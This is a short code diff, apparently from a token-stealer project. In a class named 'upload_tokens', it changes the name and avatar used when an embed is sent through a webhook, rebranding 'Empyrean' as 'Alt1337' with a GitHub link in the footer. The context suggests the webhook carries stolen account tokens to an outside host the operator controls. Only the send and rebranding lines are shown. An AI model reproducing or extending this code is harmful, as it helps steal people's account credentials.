@@ -369,4 +369,4 @@ class upload_tokens:
 
             embed.set_footer(text="github.com/Altgt1337/Alt1337")
 
-            self.webhook.send(embed=embed, username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+            self.webhook.send(embed=embed, username="Alt1337", avatar_url="https://imgur.com/xFKcvOF")
